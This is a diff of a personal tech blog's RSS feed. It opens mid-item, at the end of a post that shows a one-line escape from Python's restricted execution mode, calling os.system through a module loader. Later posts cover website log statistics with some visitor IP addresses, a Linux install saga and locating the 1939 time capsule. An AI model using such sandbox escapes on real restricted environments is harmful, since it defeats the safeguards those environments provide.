+     "python2.5/site-packages/configobj-4.4.0-py2.5.egg").load_module(
+     "configobj").os.system("ls")
+&lt;/pre&gt;
+
+&lt;/P&gt;&lt;P&gt;
+
+I considered reporting this as a bug to the Python maintainers, in
+case there was thought to slowly patch problems like this, but then
+noticed Python 3's "NEWS" file says
+
+&lt;blockquote&gt;
+- Remove the f_restricted attribute from frames.  This naturally leads to the
+  removal of PyEval_GetRestricted() and PyFrame_IsRestricted().
+&lt;/blockquote&gt;
+
+Goodbye and good riddance.  It won't confuse people into thinking it
+does something useful when it doesn't.
+
+&lt;/P&gt;
+
+</description><guid isPermaLink="true">http://www.dalkescientific.com/writings/diary/archive/2008/03/03/restricted_python.html</guid><pubDate>Mon, 03 Mar 2008 12:00:00 GMT</pubDate></item><item><title>Log analysis of my website</title><link>http://www.dalkescientific.com/writings/diary/archive/2007/12/23/navel_gazing.html</link><description>&lt;P&gt;
+
+I write these essays in part as a promotional activity.  I'm a
+consultant, and expect people to find out more about what I do through
+reading what I've written.
+
+&lt;/P&gt;&lt;P&gt;
+
+I've wondered if it's been useful, but have put off doing the analysis
+of my website.  At first it was because I didn't have enough essays to
+do interpretable analysis.  And then I just put it off.  At the German
+Chemoinformatics Conference I talked to quite a few people, mostly
+grad students, who had gotten information from my site.  That was
+enough to make me finally do some analysis.
+
+&lt;/P&gt;&lt;P&gt;
+
+I used &lt;a href="http://awstats.sourceforge.net/"&gt;awstats&lt;/a&gt;, chosen
+based on doing some web searches.  I wanted something that could
+analyze my Apache logs and could generate static pages.  There are
+other tools but since awstats did what I wanted I didn't try
+anything else.
+
+&lt;/P&gt;&lt;P&gt;
+
+So far this year I've had 1.1 million "hits", which corresponds to
+330,000 page views.  A "hit" includes images, so a page view can have
+multiple hits because of CSS, images, and other embedded content.
+Another nearly 500,000 page views comes from web spiders and other
+identifiably non-people requests.  More page requests from robots than
+people.  All told, I use less than 20GB bandwidth per year.  I use &lt;a
+href="http://pair.com/"&gt;pair Networks&lt;/a&gt; for my hosting.  My basic
+account allows 400GB/month of transfer.  I'm not even close.
+
+&lt;/P&gt;&lt;P&gt;
+
+Of the robots, Yahoo Slurp pulled down 1.6 GB, MSNBot 810 MB and and
+Googlebot 290MB.  80MB for Google's RSS reader, 7MB from Bloglines and
+5MB from UniversalFeedParser.  Of the users, 64.5% use Windows, 17%
+use Linux, 11.5% use Macs, and jumping over the BSD and Solaris users,
+a full 88 requests came from an IRIX machine.  The browser stats are 45% Firefox, 33.5% IE, 4% each Mozilla and Firefox, 3% Opera.
+
+&lt;/P&gt;&lt;P&gt;
+
+Top hit (no surprise) is my RSS feed, viewed 82,000 times this year.
+Including by aggregators so translate as you wish.  Next was my &lt;a
+href="http://dalkescientific.com/writings/diary/archive/2007/06/01/lolpython.html"&gt;LOLPython&lt;/a&gt;
+page, which wasn't a surprise.  I wrote it deliberately because of the
+then high popularity of lolcats and lolcode.  It got 17,500 views.
+About 1,200 downloads from people who weren't me.
+
+&lt;P&gt;&lt;P&gt;
+
+The next two were surprising.  I did a &lt;a
+href="http://dalkescientific.com/writings/NBN/"&gt;series of lectures for
+the NBN&lt;/a&gt;.  These were for the most part graduate students in
+biology, going into computational biology, who needed more programming
+training.  The page on &lt;a
+href="http://dalkescientific.com/writings/NBN/validation.html"&gt;Javascript
+validation&lt;/a&gt; got 7,300 hits and on &lt;a
+href="http://dalkescientific.com/writings/NBN/threads.html"&gt;threads in
+Python&lt;/a&gt;, with 5,800.  My &lt;a href="http://dalkescientific.com/writings/diary/archive/2005/04/21/screen_scraping.html"&gt;screen scraping&lt;/a&gt; was also popular, at 5,600 views.
+
+&lt;/P&gt;&lt;P&gt;
+
+Going further down the list:
+&lt;ul&gt;
+ &lt;li&gt;&lt;a href="http://dalkescientific.com/writings/diary/archive/2003/10/07/naming_molecules.html"&gt;naming molecules&lt;/a&gt; is the first chemistry page, at 4,300 hits.  I think because it uses the word "vodka"&lt;/li&gt;
+ &lt;li&gt;my &lt;a href="http://dalkescientific.com/writings/diary/archive/2007/10/07/wide_finder.html"&gt;wide finder&lt;/a&gt; commentary is only a few months old and is #11 position with 4,200 hits.  Basking in Tim Bray's shadow.&lt;/li&gt;
+ &lt;li&gt;3,200 people viewed &lt;a href="http://dalkescientific.com/bosc2002/usability/img18.html"&gt;this slide&lt;/a&gt;.  Why?  People searching for "sample use case".  But it's an image - how do the search engines know about it?&lt;/li&gt;
+ &lt;li&gt;the &lt;a href="http://dalkescientific.com/writings/diary/archive/2007/10/30/antlr_mw.html"&gt;ANTLR&lt;/a&gt; work I did is also popular.  Only 50 days old and 2,500 hits.  Well, it was on the ANTLR home page for a while.&lt;/li&gt;
+&lt;/ul&gt;
+
+I do a lot of work with cheminformatics, but that's the details.  In
+most cases my topic is more general, like how to write a C extension
+for Python (that just happens to use a chemistry toolkit).  The
+highest cheminformatics specific hit is my article on &lt;a
+href="http://dalkescientific.com/writings/diary/archive/2004/01/05/tokens.html"&gt;SMILES
+tokenization&lt;/a&gt;, with 1,500 hits.  Most of the links come from
+Wikipedia's &lt;a
+href="http://en.wikipedia.org/wiki/Simplified_molecular_input_line_entry_specification"&gt;SMILES&lt;/a&gt;
+page.  My most popular bioinformatics page is on
+&lt;a href="http://dalkescientific.com/writings/NBN/blast_parsing.html"&gt;BLAST parsing&lt;/a&gt; at just under 1,400 hits.
+
+&lt;/P&gt;&lt;P&gt;
+
+You can easily see that most people who come to my pages are there
+because of popular topics of the day (LOLPython, wide-finder) or
+general computing questions (threading, validation, HTML templates,
+Python, ANTLR).  Very few came to my pages for cheminfomatics reasons.
+Then again, there are very few people doing cheminformatics.
+
+&lt;/P&gt;&lt;P&gt;
+
+The top search phrases were:
+&lt;ul&gt;
+ &lt;li&gt;python basics - 2,200&lt;/li&gt;
+ &lt;li&gt;screen scraping - 1,600&lt;/li&gt;
+ &lt;li&gt;python trace - 1,000&lt;/li&gt;
+ &lt;li&gt;naming molecules - 1,000&lt;/li&gt;
+ &lt;li&gt;sample use case - 809&lt;/li&gt;
+ &lt;li&gt;use case sample - 610&lt;/li&gt;
+ &lt;li&gt;pyrssgen - 600&lt;/li&gt;
+ &lt;li&gt;sample use cases - 580&lt;/li&gt;
+ &lt;li&gt;boa constructor - 510 (that's a very old review of mine)&lt;/li&gt;
+ &lt;li&gt;lolpython - 500&lt;/li&gt;
+&lt;/ul&gt;
+
+Yes folks, 2,000 people came to my site for one image I have of a &lt;a
+href="http://dalkescientific.com/bosc2002/usability/img18.html"&gt;use
+case&lt;/a&gt;, from a 10 minute presentation I gave at a bioinformatics
+conference trying to convince people that usability analysis is
+important.  I don't think it had any effect.  No one came to my site
+searching for information on OEChem.
+
+&lt;/P&gt;&lt;P&gt;
+
+
+60% of the pages come from "direct address or bookmarks".  31% came
+from search engines, and 10% from referrers.  The top being
+lolcode.com, then Pythonware's Daily-URL (probably lolpython), with
+the already mentioned wide-finder (via the effbot) and ANTLR home
+page.  programming.reddit.com linked to my lolpython page, and the
+matplotlib cookbook links to my page showing how to use matplotlib
+without a GUI.
+
+&lt;/P&gt;&lt;P&gt;
+
+Lastly, hostname analysis.  Who is 207.172.151.225?  That's registered
+to the RCN Corporation and resolved at
+207-172-151-225.c3-0.gth-ubr1.lnh-gth.md.cable.rcn.com.  They sucked
+down 780 MB of my 20GB.  All to read my RSS file every hour.  Whoever
+it is doesn't know to how to ask for an If-Modified-Since as they are
+downloading the entire thing (usually unchanged) every time.  How do I
+complain?
+
+&lt;/P&gt;&lt;P&gt;
+
+The next hog is NewsAlloy through 207.230.13.10 which has downloaded
+450 MB, and makes full requests every 20 minutes.  I emailed them this:
+
+&lt;blockquote&gt;
+
+Your RSS reader at 207.230.13.10 , identified as "NewsAlloy/1.1
+(http://www.NewsAlloy.com; 1 subscribers)" is taking up 5% of my
+upload bandwidth.  While that's only 400MB/year, the underlying reason
+is because your service doesn't send the tags needed to handle HTTP
+conditional get.  My server should only need to return a 304 Not
+Modified for most cases, rather than the 200 Ok (along with over 100K
+of content).  You poll every 20 minutes, so that adds up.
+
+&lt;br /&gt;
+&lt;br /&gt;
+
+You would decrease your bandwidth use by quite a bit - perhaps an
+order of magnitude - by adding support for conditional GET requests.
+See for example:
+http://fishbowl.pastiche.org/2002/10/21/http_conditional_get_for_rss_hackers .
+
+&lt;/blockquote&gt;
+
+I admit: I do this partially to see what happens.  I got an answer
+within a few hours.  They said it shouldn't have happened and asked
+for more details.  Looking into it further I see that whever
+subscribed via their service unsubscribed a few months ago.  NewsAlloy
+hadn't made a request since then.
+
+&lt;/P&gt;&lt;P&gt;
+
+I don't know who uses NewsAlloy.  I will say that they had very
+responsive service.
+
+&lt;/P&gt;&lt;P&gt;
+
+Next on the list, at only 6MB is my ISP.  This is me checking things
+on my server, and my home page is my web site.  After that is a friend
+(I recognized the domain name) at 4MB.  He's configured his RSS reader
+to poll every 30 minutes.
+
+&lt;/P&gt;&lt;P&gt;
+
+Looking for hosts in my field, I see 2,000 requests hits from a
+biotech in England.  Ah-ha, it's one person, reading this from a
+machine with "Windows-RSS-Platform/1.0 (MSIE 7.0; Windows NT 5.1)".  Hi!
+
+&lt;/P&gt;&lt;P&gt;
+
+There are 700 page requests from the rest of pharma.  200 from one
+site (all through Google searches finding my PyDaylight work) and 100
+from another site.
+
+&lt;/P&gt;
+
+
+
+</description><guid isPermaLink="true">http://www.dalkescientific.com/writings/diary/archive/2007/12/23/navel_gazing.html</guid><pubDate>Sun, 23 Dec 2007 12:00:00 GMT</pubDate></item><item><title>Installing Linux</title><link>http://www.dalkescientific.com/writings/diary/archive/2007/12/20/installing_linux.html</link><description>&lt;P&gt;
+
+Forenote: Glyph wrote me wondering how I managed to get things so messed up.  He wrote
+
+&lt;blockquote&gt;
+First, let me tell you how this whole mess is _supposed_ to go.  You put in the install disk, it brings up a nice graphical display.  It asks you for your target disk - which the installer *does* see.  You can then use the full OS (pidgin, gimp, emacs, python, whatever you like) while the installation takes place in the background.  There's a menu, which looks like a cell phone "bars" icon, and works more or less like the Airport menu, for setting up wireless.  You definitely shouldn't have to type "dhclient3" on the command-line!  I've probably installed ubuntu 30 times over the past 2 years, and modulo a few minor problems with nvidia cards giving me distorted resolutions, it has always worked that way.
+&lt;/blockquote&gt;
+&lt;blockquote&gt;
+I have no idea about the hard drive issue, but it sounds like your post- installation woes were likely caused by using the "server" installation CD instead of the "desktop" one.
+&lt;/blockquote&gt;
+
+Thinking backwards, that's almost certainly what happened.  When I
+went to the &lt;a href="http://www.ubuntu.com/"&gt;Ubuntu&lt;/a&gt; page there was
+the option of "desktop" or "server" options.  I wanted to install
+servers like Apache and MySQL.  I figured a desktop machine is for
+people who want a web browser and some applications, while I wanted
+gcc, the unix command-line tools, etc. that I would use when
+developing servers.  Plus, it says that the LTS server version gets a
+longer support - 5 years instead of 3 for the desktop.  (I did not get
+the LTS version; I'm explaining how I decided to choose 'server' over
+'desktop'.) I figured that was the case because the end-user
+applications change more frequently than the relatively stable
+development software.
+
+&lt;/P&gt;&lt;P&gt;
+
+Nothing on the Ubuntu page described the difference between desktop
+and server.  That's changed.  If you look at the page now you'll see
+that the "desktop" option shows a picture of a laptop, the "server"
+option shows some rack mounted machines, and there's links for each
+saying "learn more".  This changed about 10 minutes ago because when I
+started writing this update it still had the old layout.  Looking back
+through archive.org's history, it seems the lack of a "learn more" was
+an anomaly.  Eg, you can see it exists in the snapshots from:
+&lt;a href="http://web.archive.org/web/20070612223139/http://www.ubuntu.com/"&gt;12 June 2007&lt;/a&gt;
+and
+&lt;a href="http://web.archive.org/web/20070110072251/http://www.ubuntu.com/"&gt;10 Jan 2007&lt;/a&gt;.  Archive.org lists nothing for since June and now.  A-ha!  At least for now you can see what used to be on the front page &lt;a href="http://www.ubuntu.com/getubuntu/download"&gt;here&lt;/a&gt;, or here's a screenshot to show I wasn't being completely an ignoramus:
+&lt;br /&gt;
+&lt;center&gt;
+&lt;a href="http://dalkescientific.com/writings/diary/get_ubuntu_snapshot.png"&gt;&lt;img width="463" height="302" src="http://dalkescientific.com/writings/diary/get_ubuntu_snapshot.png" /&gt;&lt;/a&gt;
+&lt;/center&gt;
+
+
+&lt;/P&gt;&lt;P&gt;
+Grrrrrrrrr......!
+&lt;/P&gt;&lt;hr /&gt;&lt;P&gt;
+
+Pipeline Pilot is a visual dataflow system with a domain focus in
+computational chemistry.  Because of it's very strong marketing
+background and good technology, it's made a big noise on the small
+domain I work in.  I happen to &lt;a
+href="http://dalkescientific.com/writings/diary/archive/2003/09/22/VisualProgramming.html"&gt;dislike
+dataflow systems&lt;/a&gt; and think its popularity is a measure of how
+generally unusable (in the HCI sense) chemistry software is.  And
+again, marketing works.
+
+&lt;/P&gt;&lt;P&gt;
+
+Pipeline Pilot is a big scary monster to some of the other vendors.
+As a result, &lt;a href="http://knime.org/"&gt;Knime&lt;/a&gt;, which is a
+dual-licensed free/commercial package from a university group, also
+with a chemistry focus, is itself getting some attention.  A few
+people have asked me if I've looked at it, and I haven't.  But I'm a
+consultant and perhaps it's something I should know about so people
+will give me money.
+
+&lt;/P&gt;&lt;P&gt;
+
+Which reminds me, I do more than consult for computational chemistry,
+so if you're looking for an experienced Python developer based in
+G&amp;ouml;teborg, Sweden, &lt;a
+href="mailto:dalke@dalkescientific.com"&gt;email me&lt;/a&gt;.  (After the
+fact: but obviously don't hire me as a system administrator
+&lt;tt&gt;:)&lt;/tt&gt;
+
+&lt;/P&gt;&lt;P&gt;
+
+My primary machine is a Mac.  I used to have a Thinkpad 600E (or some
+number like that) which worked out pretty well.  I upgraded to a T23
+but ended up with lots of programs getting Linux installed on it.  My
+girlfriend at the time, a big Mac fan, helped convince me to get a Mac.
+I've not looked back sense.
+
+&lt;/P&gt;&lt;P&gt;
+
+Sometimes I need to go back.  There is after all software that doesn't
+run on a Mac.  One is Knime.  It's written Java but there's some
+conflict between the AWT and the Eclipse SWT that means it doesn't
+work on my machine.  When I visited friends in the US over
+Thanksgiving I pulled out my old T23 which I had stored in their
+garage.  Perhaps I could use that to run the Linux version.
+
+&lt;/P&gt;&lt;P&gt;
+
+I tried to boot it but it didn't find the hard disk.  Strange.  Wonder
+if the disk went bad.  I took it with my back from the US and since
+bad contacts are an easy problem to fix I did the first trick of
+pulling things apart and putting it back together again.  Nope.
+Didn't work. 
+
+&lt;/P&gt;&lt;P&gt;
+
+I made a install disk for Ubuntu Linux (Fiesty) to see what that would
+tell me.  Went through the first few screens but couldn't find a disk.
+To be correct, it couldn't figure out which driver to use for the
+disk.  My translation: disk is bad or hardware to the disk is bad.  I
+figured the first case was more likely and went looking for a
+replacement.  First step was to a local computer repair shop.  He said
+(in Swedish as his English wasn't good), "yes, the disk is bad."
+
+&lt;/P&gt;&lt;P&gt;
+
+I went to a computer store on Hisingen (that's the island immediately
+across from downtown) and asked about getting a new hard disk.  They
+didn't have any in stock that would work and suggested I go to another
+computer store somewhat nearby.  He showed me where on the map but I
+had never been there, it wasn't easy to go to without a car, and it
+was about 5pm so the sun had set 1.5 hours earlier and I didn't want
+to hunt around in the darkness.  I went home and looked up the place
+on the map so I could orient myself better.
+
+&lt;/P&gt;&lt;P&gt;
+
+It was also on Hisingen, but the bus that way goes only every 30
+minutes so it was about a 15-20 minute walk from the Frihamn stop.
+Got there.  It reminded me of a NAPA auto parts place, or of the
+really good hardware stores.  The ones where you go to the desk and
+say "I want a 8-inch left-handed variable-speed smoke-shifter" and
+they'll get it for you from the stock room.  They had a replacement
+drive, in 80 GB (the old was 50).
+
+&lt;/P&gt;&lt;P&gt;
+
+While I was there I opened the bag, plugged in the machine and ... no
+go.  The machine still didn't see the disk.  So it looks like I just
+wasted money for nothing.  I checked - no return policy for this, even
+though I hadn't even left the store.  I then checked with the repairs
+people, but they don't repair laptops, only desktops.  They did give
+me the name of a place to go to, but I'm thinking the price is getting
+too much for exploratory research.
+
+&lt;/P&gt;&lt;P&gt;
+
+Subscribing to the sunken cost fallacy, can I spend some more money so
+the money I spent didn't go to waste?  Well, I can buy an IDE enclosure
+so I can get my Mac to connect to the new drive over USB.  Plus, the
+T23 might be see a USB drive.  I bought it.
+
+&lt;/P&gt;&lt;P&gt;
+
+Started working on that today.  (This is now day 3 of the attempt to
+install Knime.)  Whaddaya know, the Ubuntu installer sees the USB disk
+and I can install onto it.  And boot.  It's dog slow because
+everything's going over USB2 and not the IDE bus, but usable.  Problem
+is, there's only a console.  I don't have a GUI and can't figure out
+how to get the wireless working so I can connect to my local base
+station.
+
+&lt;/P&gt;&lt;P&gt;
+
+Strange thing is that I can only get a console interface.  Where's X?
+When I installed there were a bunch of red lines in the output when it
+tried to connect over the network.  Because wireless wasn't working, I
+had told it I would configure the network later.  Perhaps had I had
+the network going it would have worked better?  Or are all Ubuntu
+installs like this?
+
+&lt;/P&gt;&lt;P&gt;
+
+How do I install X?  "xinit"?  Nope.  Though the error message gives
+me something about using apt to install a package.  Tried that out.
+Red lines.  Try "apt" and the various apt-programs.  Figured out how
+to tell it to look at the CD-ROM for files.  (Or it knew it already.)
+Messed around some, got some X client apps installed, but no X server.
+Do I need to connect to the network for the rest of this?
+
+&lt;/P&gt;&lt;P&gt;
+
+Finally gave up, unplugged my Airport Express (I have no router so can
+only plug one Ethernet cable in.)  Nothing.  Power-cycled the DSL
+modem.  ifconfig says I've got some network traffic on eth0, but no
+DHCP.  How do you tell Ubuntu/Linux to enable dhcp?  Does the network
+even work?  The install disk lets me configure for DHCP so rebooted
+with that.  Yippee!  It sees the network, and I can ssh out.  But how
+do make that work with my install.  Should I just reinstall from
+scratch given that I can see the network now?  In retrospect I think
+the answer is "yes".
+
+&lt;/P&gt;&lt;P&gt;
+
+There's a program called "dhclient3".  Wonder what that does.  Run it.
+Interesting.  Looks like .. yes .. I've got a DHCP connection.  My
+"nslookup www" fails instead of timing out.  I can see the outside
+world.
+
+&lt;/P&gt;&lt;P&gt;
+
+Worked with "apt" some more and figured out how to get the X server
+running.  "startx" to get into it - and it exists.  No window manager
+found.  What does Ubuntu use?  Gnome, right?  Used apt to install
+various Gnome parts.  Now I can get a system working .. but there's no
+window manager.  I had installed metacity.  How do I start it?
+Where's the terminal?  Can't find that, but was able to make a desktop
+item that starts "/bin/bash" in a terminal.  Only to get the message
+that gnome-terminal wasn't installed.
+
+&lt;/P&gt;&lt;P&gt;
+
+At this point I'm in the GUI, "Synaptic Packager Manager" and I
+install gnome-terminal.  That's enough to get a window open where I
+can type "metacity".  Terminal, web browser, and the ability to swap
+between windows.  What more does anyone need?
+
+&lt;/P&gt;&lt;P&gt;
+
+For one, a slew of missing programs.  A lot of Unix system utilities
+are missing.  Go through Synaptic and toggle the ones that look
+important.  There's an icon by some of them which I think means "part
+of the normal Ubuntu install".  I clicked on that column so I would
+see them grouped together.  After 5 minutes of near 100% CPU use I
+killed it and started again.
+
+&lt;/P&gt;&lt;P&gt;
+
+Toggled on the ones that I thought were useful, and chose ones like
+OpenOffice that have a lot of dependencies.  Install.  Time to go out
+salsa dancing.  Came back.
+
+&lt;/P&gt;&lt;P&gt;
+
+In various bits of playing around I found the Network Manager and
+enabled eth0.  Tried to enable my wireless but I've forgotten the
+password.  I think I'll just reset it and let it be open.  I still
+haven't figure out how to get Metacity as the initial window manager.
+And I installed yet more programs.  I tried "wicd" as a perhaps easier
+way to deal with my wireless.  It's got a tray control that might be
+something like what my Mac has.  It worked enough to tell me the
+wireless was working, but then it failed, miserably, with a Python
+traceback saying it tried to send a Unicode string over DBUS.  (Note
+to self; you've also said you're going to look into DBUS.)  I couldn't
+get it working again.
+
+&lt;/P&gt;&lt;P&gt;
+
+In the meanwhile I downloaded Knime.  All 170MB or so for the
+developer's version.  This includes code from Eclipse, but it's huge.
+There's no reason such a program should take so much space, I think.
+Why, "when I was a kid I had ...."  I remember Craig and I being
+astonished in 1990 when we took an operating system's course and found
+out that SunOS's kernel was over 1MB.  On the other hand, it doesn't
+take all that long to download.  I've got a 2MBit/sec connection here,
+for the same price as my old sub-1MBit/sec in Santa Fe.
+
+&lt;/P&gt;&lt;P&gt;
+
+I should reboot.  In addition to getting the network (hopefully)
+working, I also installed a libc security update.  I wonder if I'll
+get a GUI login.  ... Or if it will boot. .... Well, that took a
+while.  Text prompt, then startx, then .. oops, to the terminal to
+start metacity.  Cool, the DNS is working.  Go back to the package
+manager.  A-ha!  There's a "ubuntu-desktop" option (and a few others)
+which are virtual packages that load all of the dependencies.  Looks
+like I'm missing a lot of files.  *sigh* 
+
+&lt;/P&gt;&lt;P&gt;
+
+While that's happening I did get Eclipse/Knime started.  The first
+line in the README is .. "update the Knime installation."
+
+&lt;/P&gt;&lt;P&gt;
+
+Why am I writing this now?  I'll skip the obvious Mac vs. Linux
+comparisons.  The Ubuntu people are working on a really hard problem
+that Mac doesn't have because Apple controls the platform.  A question
+is, should I be proud happy, excited or otherwise joyous that I
+managed to get all of this working?  It was a lot to figure out on my
+own and there's many who wouldn't have gotten it, or would have given
+up, or would have (as I should have), just reinstalled and seen if
+that improved things.  
+
+&lt;/P&gt;&lt;P&gt;
+
+In looking up some of the network problems I found several which had
+step-by-step walkthroughs of the installation process, and even one
+which had a video clip of a guy talking about the installation and
+suggestions for what to install afterwards.  That's where I got the
+pointer to wicd.  Yet it feels like the same problem I have when I buy
+a new computer.  The field changes so much and I don't pay enough
+attention to it so that the knowledge gained doesn't really help for
+the next time.
+
+&lt;/P&gt;&lt;P&gt;
+
+There are people who like tracking hardware and OS information.  I'm
+more at the application level, and do that myself with APIs and
+libraries and web interfaces.  Which means I feel these last three
+days was almost a complete waste.  I like being able to ignore things
+I don't care about.  Linux feel more written for those who care about
+things I don't.
+
+&lt;/P&gt;&lt;P&gt;
+
+I hope the Knime investigation is worth it.  There are a couple of
+other things I'm thinking to do with an extra Linux machine, so this
+isn't the only reason, just the driving one.  But perhaps serendipity
+will strike with the others.
+
+&lt;/P&gt;&lt;P&gt;
+
+P.S. It's now the next day from when I wrote that.  Everything's
+downloaded, installed (except some acp things that Synaptic said
+didn't install correctly and were removed; and Eclipse demanded
+interaction when looking for a mirror when I wanted to let it go
+overnight while I slept so I had to finish that off this morning) and
+working.  I haven't yet checked to see if get a graphical login after
+reboot, or working window manager.  What I've got is good enough.
+I'll say it again - working from a USB2-based drive is mind numbingly
+slow.
+
+&lt;/P&gt;
+</description><guid isPermaLink="true">http://www.dalkescientific.com/writings/diary/archive/2007/12/20/installing_linux.html</guid><pubDate>Thu, 20 Dec 2007 12:00:00 GMT</pubDate></item><item><title>Time capsule</title><link>http://www.dalkescientific.com/writings/diary/archive/2007/12/03/time_capsule.html</link><description>&lt;P&gt;
+
+Came across this link on &lt;a
+href="http://boingboing.net/"&gt;BoingBoing&lt;/a&gt; about &lt;a
+href="http://www.boingboing.net/2007/12/03/protechanticommie-vi.html#comments"&gt;a
+film about the 1939 World's Fair.  It's &lt;i&gt;&lt;a
+href="http://www.archive.org/details/middleton_family_worlds_fair_1939"&gt;The
+Middleton Family at the New York World's Fair"&lt;/a&gt;&lt;/i&gt; and available
+through &lt;a href="http://archive.org/"&gt;archive.org&lt;/a&gt;.  I watched some
+of it.  Can't say it was worthwhile.
+
+&lt;/P&gt;&lt;P&gt;
+
+One of the things it mentioned was the &lt;a
+href="http://www.archive.org/details/timecapsulecups00westrich"&gt;time
+capsule&lt;/a&gt; buried then, to be opened in 5,000 years.  The term &lt;a
+href="http://en.wikipedia.org/wiki/Time_capsule"&gt;time capsule&lt;/a&gt; was
+invented specifically for it, though &lt;a
+href="http://www.oglethorpe.edu/about_us/crypt_of_civilization/international_time_capsule_society.asp"&gt;the
+practice is older&lt;/a&gt;.  How will the people of the year 6939 know
+about the time capsule?  One way was to publish a book, with copies
+sent to &lt;a
+href="http://www.nytimes.com/specials/magazine3/record.html"&gt;libraries
+and archives around the world&lt;/a&gt;, titled &lt;i&gt;&lt;a
+href="http://www.archive.org/details/timecapsulecups00westrich"&gt;The
+Book of Record of The Time Capsule&lt;/a&gt;&lt;/i&gt;.  On acid free paper that
+should last a long time, with copies distributed widely, in the hopes
+that in the deep future someone will come across it and think to find
+and open the capsule.
+
+&lt;/P&gt;&lt;P&gt;
+
+I read part of the book.  It's in the somewhat florid style of the
+time, which I think gets its influence from oratory.  
+
+&lt;blockquote&gt;
+
+By A.D. 6939, it is probable, all present-day landmarks, city surveys,
+and other such aids for locating such an object will have
+disappeared. The spot may still be discovered, however, by
+determination of the latitude and longitude. The exact geodetic
+coordinates [North American Datum of 1927J are :
+
+&lt;pre&gt;
+    Latitude 40&amp;deg; 44' 34". 089 north of the Equator 
+    Longitude 73&amp;deg; 50' 43".842 west of Greenwich
+&lt;/pre&gt;
+
+&lt;/blockquote&gt;
+
+&lt;/P&gt;&lt;P&gt;
+
+I'm writing this only 68 years in the future.  There are people still
+alive who were at that fair.  I could find the capsule's location in
+many ways, but I decided to use the lat/long.  Using &lt;a
+href="http://maps.google.com/maps?f=q&amp;hl=en&amp;geocode=&amp;time=&amp;date=&amp;ttype=&amp;q=%2B40%C2%B0+44'+34.089%22,+-73%C2%B0+50'+43.84%22&amp;ie=UTF8&amp;z=16&amp;iwloc=addr&amp;om=1"&gt;Google
+maps&lt;/a&gt; I see it's in Flushing Meadows Park, which is also where
+other sources say it is.  But it's very close to some limited access
+roads and doesn't appear to be anything at the spot.
+
+&lt;/P&gt;&lt;P&gt;
+
+We no longer use the North American Datum of 1927.  I &lt;a
+href="http://www.ngs.noaa.gov/cgi-bin/nadcon.prl"&gt;converted from NAD27
+to NAD83&lt;/a&gt; to get 40&amp;deg; 44' 34.45671"  N by  73&amp;deg; 50' 42.32593" W, which is a shift of 37.289 meters.  Bingo!  &lt;a href="http://maps.google.com/maps?f=q&amp;hl=en&amp;geocode=&amp;time=&amp;date=&amp;ttype=&amp;q=%2B40%C2%B0+44'+34.45671%22,+-73%C2%B0+50'+42.32593%22&amp;ie=UTF8&amp;ll=40.742905,-73.845091&amp;spn=0.000609,0.000885&amp;t=h&amp;z=20&amp;om=1"&gt;Arrow marks the spot&lt;/a&gt;.
+
+&lt;/P&gt;
+</description><guid isPermaLink="true">http://www.dalkescientific.com/writings/diary/archive/2007/12/03/time_capsule.html</guid><pubDate>Mon, 03 Dec 2007 12:00:00 GMT</pubDate></item></channel></rss>
